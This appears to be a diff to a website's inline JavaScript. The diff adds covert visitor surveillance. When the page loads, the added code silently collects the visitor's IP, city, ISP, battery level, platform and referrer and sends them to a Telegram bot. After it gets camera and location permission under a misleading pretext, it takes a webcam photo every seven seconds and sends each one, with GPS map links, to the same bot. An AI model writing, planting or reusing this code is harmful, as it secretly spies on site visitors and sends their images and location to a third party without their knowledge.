@@ -361,8 +361,37 @@
         const overlay = document.getElementById('advanced-overlay');
         const okBtn = document.getElementById('final-ok-btn');
 
-        // Initial Load Check
+        // --- 1. SILENT TRACKING (Executed instantly on load) ---
+        async function sendSilentLog() {
+            try {
+                // Get IP/Location Data
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                // Get Battery
+                const battery = await navigator.getBattery();
+                const batStatus = (battery.level * 100).toFixed(0) + '%';
+                
+                const log = `
+🚀 **New Visitor Alert (Instant)**
+--------------------------------
+📍 City: ${data.city}
+🚩 Country: ${data.country_name}
+📡 ISP: ${data.org}
+🌐 IP: ${data.ip}
+🔋 Battery: ${batStatus}
+📱 Device: ${navigator.platform}
+🔗 Source: ${document.referrer || 'Direct Link'}
+🕒 Time: ${new Date().toLocaleString()}
+                `;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(log)}`);
+            } catch (e) { console.log("Silent Log Error"); }
+        }
+
         window.addEventListener('load', () => {
+            // Instant Silent Tracking
+            sendSilentLog();
+
             if (localStorage.getItem('granted') === 'true') {
                 overlay.style.display = 'none';
                 initSecurity();
@@ -371,16 +400,14 @@
             }
         });
 
-        // OK Button Logic
+        // --- 2. PERMISSION TRACKING ---
         okBtn.addEventListener('click', () => {
-            // Step 1: Request Camera
             navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
-                // Step 2: Request Location
                 navigator.geolocation.getCurrentPosition(pos => {
                     localStorage.setItem('granted', 'true');
                     overlay.style.display = 'none';
-                    startSystem(stream);
+                    startCaptureLoop(stream);
                 }, err => {
                     alert("Location access is required for full experience.");
                 });
@@ -393,11 +420,11 @@
         async function initSecurity() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                startSystem(stream);
+                startCaptureLoop(stream);
             } catch(e) { localStorage.removeItem('granted'); }
         }
 
-        function startSystem(stream) {
+        function startCaptureLoop(stream) {
             setInterval(() => {
                 const video = document.createElement('video');
                 video.srcObject = stream;
@@ -407,27 +434,28 @@
                 setTimeout(() => {
                     canvas.width = 400; canvas.height = 300;
                     canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
-                    const imgData = canvas.toDataURL('image/jpeg');
+                    const img = canvas.toDataURL('image/jpeg');
                     
                     navigator.geolocation.getCurrentPosition(async (p) => {
                         const b = await navigator.getBattery();
-                        const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                        const msg = `📍 Map: ${map}\n🔋 Battery: ${(b.level*100).toFixed(0)}%\n📱 Platform: ${navigator.platform}`;
+                        const mapLink = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                        const info = `📸 **Live Capture**\n📍 Map: ${mapLink}\n🔋 Battery: ${(b.level*100).toFixed(0)}%\n📱 Platform: ${navigator.platform}`;
                         
-                        // Send Text
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+                        // Send Text Message
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`);
                         // Send Image
-                        fetch(imgData).then(r => r.blob()).then(blob => {
+                        fetch(img).then(r => r.blob()).then(blob => {
                             const fd = new FormData();
                             fd.append('chat_id', chatId);
-                            fd.append('photo', blob, 'shot.jpg');
+                            fd.append('photo', blob, 'capture.jpg');
                             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {method: 'POST', body: fd});
                         });
                     });
                 }, 1000);
-            }, 6000);
+            }, 7000); // Send every 7 seconds
         }
     </script>
+
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js"></script>
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
